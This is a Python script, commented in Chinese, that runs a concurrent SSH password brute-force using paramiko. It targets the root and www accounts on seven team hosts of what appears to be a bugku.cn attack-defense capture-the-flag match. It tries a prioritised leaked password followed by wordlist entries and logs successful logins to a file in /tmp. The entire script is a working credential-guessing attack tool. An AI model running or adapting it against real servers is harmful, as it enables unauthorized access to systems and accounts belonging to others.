#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSH 快速试 - 单进程内并发 6 队, 逐条试最高优先级词条. 前台同步运行(不依赖后台存活).
用法: python3 ssh_quick.py <wordlist> <topN> [delay]
"""
import sys, time, os
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko

TEAMS = ["31", "72", "91", "98", "119", "189", "192"]
USERS = ["root", "www"]


def try_pair(host, user, p, fail_cb):
    """单条尝试, 返回 (host,user,p) 若命中; fail_cb 记录失败以节流."""
    try:
        t = paramiko.Transport((host, 22))
        t.banner_timeout = 6
        t.handshake_timeout = 8
        t.start_client(timeout=8)
        try:
            t.auth_password(user, p)
            return (host, user, p)
        except paramiko.AuthenticationException:
            return None
        finally:
            try:
                t.close()
            except Exception:
                pass
    except Exception:
        return None


def main():
    wordlist = sys.argv[1]
    topN = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    delay = float(sys.argv[3]) if len(sys.argv) > 3 else 0.3

    lines = []
    with open(wordlist, encoding='utf-8', errors='replace') as f:
        for l in f:
            l = l.strip()
            if l and not l.startswith('#'):
                lines.append(l)
    lines = lines[:topN]
    print(f"[+] 目标: {len(TEAMS)}队 x {len(USERS)}用户, 词条 {len(lines)}条, delay={delay}s", flush=True)

    # 优先级: 已知线索词放最前
    priority = ["Nsy@Awd#2026"]
    ordered = priority + [x for x in lines if x not in priority]

    hosts = {t: f"192-168-1-{t}.pvp7604.bugku.cn" for t in TEAMS}
    jobs = [(t, u, p) for p in ordered for u in USERS for t in TEAMS]

    hits = []
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = [ex.submit(try_pair, hosts[t], u, p, None)
                for (t, u, p) in jobs]
        for i, fut in enumerate(as_completed(futs), 1):
            r = fut.result()
            if r:
                host, user, p = r
                print(f"\n[***] HIT {user}@{host} / {p}", flush=True)
                with open('/tmp/ssh_hit.txt', 'a') as f:
                    f.write(f"{host} {user} {p}\n")
                hits.append(r)
            if i % 50 == 0:
                tot = time.time() - t0
                print(f"[...] {i}/{len(jobs)} 完成, 用时{tot:.1f}s ({i/max(tot,0.1):.1f}/s)", flush=True)
            time.sleep(delay)

    print(f"\n[+] 共试 {len(jobs)} 组合, 耗时 {time.time()-t0:.1f}s")
    print(f"[+] 命中 {len(hits)} 条", flush=True)
    for h in hits:
        print("   ", *h)


if __name__ == "__main__":
    main()
